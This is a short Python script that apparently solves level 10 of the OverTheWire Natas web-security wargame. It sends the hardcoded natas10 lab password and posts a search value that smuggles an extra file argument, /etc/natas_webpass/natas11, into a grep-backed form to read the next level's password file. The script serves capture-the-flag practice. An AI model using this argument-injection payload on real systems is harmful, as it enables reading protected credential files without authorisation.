import requests
import re

username = "natas10"
password = "nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu"

url = 'http://{}.natas.labs.overthewire.org'.format(username)
r = requests.post(url, auth=(username, password), data={"needle": "1 /etc/natas_webpass/natas11 "})

content = r.text

print("\n\nthe password for next level = ", re.findall("11:(.*)", content)[0])


